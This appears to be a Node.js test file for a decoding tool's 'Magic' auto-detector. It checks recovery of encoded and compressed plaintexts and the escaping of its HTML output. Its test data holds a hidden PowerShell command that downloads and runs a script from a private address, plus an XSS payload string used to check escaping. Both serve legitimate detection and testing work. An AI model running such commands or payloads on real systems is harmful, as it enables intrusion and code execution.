#!/usr/bin/env node
// SPDX-License-Identifier: MIT
// Accuracy regression test for the Magic decoder (core/magic.js) and its graphical output.
// Encodes known plaintexts with HexSpindle's own operations, then checks that Magic's top suggestion
// recovers them, and that inputs with nothing to decode are not given a confident suggestion.
// Runs in Node: operations that need a browser DOM (e.g. From HTML Entity) are covered by the browser tests.
import '../modules/index.js';
import { MODULES, Html } from '../core/registry.js';
import { callModule, resolveArgs } from '../core/engine.js';
import { search } from '../core/magic.js';

const enc = new TextEncoder(), dec = new TextDecoder();
const run = async (data, name, args = []) => {
  const mod = MODULES[name];
  if (!mod) throw new Error(`Missing operation: ${name}`);
  return (await callModule(mod, data, resolveArgs(mod, args, new Map())))[0];
};
const chain = async (data, steps) => {
  if (typeof data === 'string') data = enc.encode(data);
  for (const step of steps) data = await run(data, ...(Array.isArray(step) ? step : [step]));
  return data;
};
const utf16le = s => Uint8Array.from({ length: s.length * 2 }, (_, i) => i % 2 ? s.charCodeAt(i >> 1) >> 8 : s.charCodeAt(i >> 1) & 255);

const TEXT = {
  english: 'The quick brown fox jumps over the lazy dog. This is a secret message used for testing the decoder.',
  json: '{"user":"admin","token":"abc123","roles":["reader","writer"],"active":true}',
  command: 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://10.0.0.5/a.ps1\')"',
  persian: 'سلام دنیا، این یک پیام آزمایشی است.',
  flag: 'flag{th1s_1s_4_t3st_fl4g}',
};
const LONG = (TEXT.english + ' ' + TEXT.json + ' ').repeat(4);
const HEX = ['To Hex', ['None']];

// [label, plaintext, encoding steps, options]
const DECODABLE = [
  ...['english', 'json', 'command', 'persian', 'flag'].flatMap(k => [
    [`Base64 (${k})`, TEXT[k], ['To Base64']],
    [`Hex (${k})`, TEXT[k], [HEX]],
    [`Base64 of Base64 (${k})`, TEXT[k], ['To Base64', 'To Base64']],
    [`Base64 of Gzip (${k})`, TEXT[k], ['Gzip', 'To Base64']],
  ]),
  ['Hex with spaces', TEXT.english, [['To Hex', ['Space']]]],
  ['Hex with 0x prefixes', TEXT.english, [['To Hex', ['0x with comma']]]],
  ['Base32', TEXT.english, ['To Base32']],
  ['Base58', TEXT.english, ['To Base58']],
  ['Base85', TEXT.json, ['To Base85']],
  ['Base45', TEXT.english, ['To Base45']],
  ['Base62', TEXT.english, ['To Base62']],
  ['Binary', TEXT.flag, ['To Binary']],
  ['Decimal', TEXT.english, ['To Decimal']],
  ['Octal', TEXT.english, ['To Octal']],
  ['URL encoding', TEXT.json, [['URL Encode', [true]]]],
  ['Hexdump', TEXT.english, ['To Hexdump']],
  ['Unicode escapes', TEXT.persian, ['Escape Unicode Characters']],
  ['ROT13', TEXT.english, ['ROT13']],
  ['Caesar shift 5', TEXT.english, [['ROT13', [true, true, false, 5]]]],
  ['ROT47', TEXT.english, ['ROT47']],
  ['Reversed text', TEXT.english, ['Reverse']],
  ['PowerShell -EncodedCommand (Base64 of UTF-16LE)', TEXT.command, ['To Base64'], { from: utf16le(TEXT.command) }],
  ['Three stages: Hex of Base64 of Gzip', TEXT.json, ['Gzip', 'To Base64', HEX]],
  ['Three stages: Base32 of Base64 of Hex', TEXT.english, [HEX, 'To Base64', 'To Base32']],
  ['Four stages: Base64 x4', TEXT.english, ['To Base64', 'To Base64', 'To Base64', 'To Base64'], { depth: 4 }],
  ['Reversed Base64', TEXT.json, ['To Base64', 'Reverse']],
  ['XOR 0x5a (intensive)', TEXT.english, [], { intensive: true, map: b => b ^ 0x5a }],
  // Compression, detected by header or by trial for headerless formats.
  ...[['Gzip', 'Gzip'], ['Zlib', 'Zlib Deflate'], ['Raw Deflate', 'Raw Deflate'], ['Zstandard', 'Zstandard Compress'], ['LZ4', 'LZ4 Compress', ['Frame']],
    ['LZMA', 'LZMA Compress', ['Raw LZMA (alone)']], ['Snappy', 'Snappy Compress'], ['LZF', 'LZF Compress'], ['ZIP', 'Zip']].flatMap(([label, op, args = []]) => [
    [`${label} bytes`, LONG, [[op, args]]],
    [`Base64 of ${label}`, LONG, [[op, args], 'To Base64']],
  ]),
  ['LZString (Base64)', LONG, [['LZString Compress', ['Base64']]]],
];

const NOT_DECODABLE = [
  TEXT.english, TEXT.json, TEXT.command, TEXT.persian, 'password', 'administrator', 'HelloWorld12', 'DEADBEEF', 'cafebabe', '1234567890',
  '5d41402abc4b2a76b9719d911017c592', '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824', '550e8400-e29b-41d4-a716-446655440000',
  '192.168.100.254', 'someone@example.com', '2026-10-13T10:11:44Z', 'GET /api/v1/items?limit=20 HTTP/1.1', 'id,name,score\n1,alice,90\n2,bob,85',
  'Meet me at the usual place at noon tomorrow', 'SELECT id FROM accounts WHERE active = 1 ORDER BY id;',
  Uint8Array.from({ length: 256 }, (_, i) => (i * 197 + 91 * ((i * i) % 251)) & 255),
];

const CONFIDENT = 50;
const same = (a, b) => a.length === b.length && a.every((x, i) => x === b[i]);
const describe = r => r ? `${r.stages.map(s => s.label).join(' > ') || '(input as-is)'} [${r.score}%] ${JSON.stringify(dec.decode(r.data.subarray(0, 40)))}` : '(nothing)';
const failures = [];
let passed = 0;

for (const [label, plain, steps, opt = {}] of DECODABLE) {
  try {
    const want = opt.from || enc.encode(plain);
    let input = await chain(want, steps);
    if (opt.map) input = input.map(opt.map);
    const results = await search(input, opt.depth || 3, !!opt.intensive);
    const top = results[0];
    const expected = opt.from ? enc.encode(plain) : want;
    if (top.path.length && same(top.data, expected) && top.score >= CONFIDENT) passed++;
    else failures.push(`${label}: expected the plaintext as top suggestion, got ${describe(top)}`);
  } catch (e) { failures.push(`${label}: ${e.message}`); }
}
for (const sample of NOT_DECODABLE) {
  const input = typeof sample === 'string' ? enc.encode(sample) : sample;
  const best = (await search(input, 3)).find(r => r.path.length);
  if (!best || best.score < CONFIDENT) passed++;
  else failures.push(`Nothing to decode in ${JSON.stringify(dec.decode(input.subarray(0, 40)))}, but Magic suggested ${describe(best)}`);
}

// Graphical output: an Html result with a bar per candidate, a stage breakdown, and input that stays escaped.
const hostile = '<img src=x onerror=alert(1)><script>alert(2)</script> "quoted" & done';
const graphic = await MODULES.Magic.func(await chain(hostile, ['To Base64', HEX]), 3, false, '', 8, false, 'Graphical');
const html = String(graphic);
const checks = [
  [graphic instanceof Html, 'Graphical output is not an Html result'],
  [/class="mg-bar"><i style="width:[\d.]+%;background:hsl\(\d+,72%,42%\)"/.test(html), 'Confidence bar missing'],
  [html.includes('Stage 2 · From Base64'), 'Stage breakdown missing'],
  [!/<img|<script/i.test(html.replace(/<style>[\s\S]*?<\/style>/, '')), 'Decoded input reached the output unescaped'],
  [html.includes('&lt;script&gt;'), 'Escaped preview missing'],
  [(() => {
    const m = /^<!--hexspindle-magic:([A-Za-z0-9+/=]+)-->/.exec(html);
    const list = m && JSON.parse(Buffer.from(m[1], 'base64').toString('utf8'));
    return Array.isArray(list) && list.length === 1 && list[0].score >= 80 && list[0].recipe.map(s => s[0]).join() === 'From Hex,From Base64';
  })(), 'Add-to-recipe marker for the very likely match is missing or wrong'],
  [typeof await MODULES.Magic.func(enc.encode('aGVsbG8gd29ybGQ='), 3, false, '', 8, false, 'Ranked list') === 'string', 'Ranked list output is not text'],
];
for (const [ok, message] of checks) { if (ok) passed++; else failures.push(message); }

const total = DECODABLE.length + NOT_DECODABLE.length + checks.length;
for (const f of failures) console.error(`FAIL ${f}`);
console.log(`Magic decoder: ${passed}/${total} checks passed (${DECODABLE.length} decodable, ${NOT_DECODABLE.length} not decodable, ${checks.length} output checks)`);
if (failures.length) process.exitCode = 1;
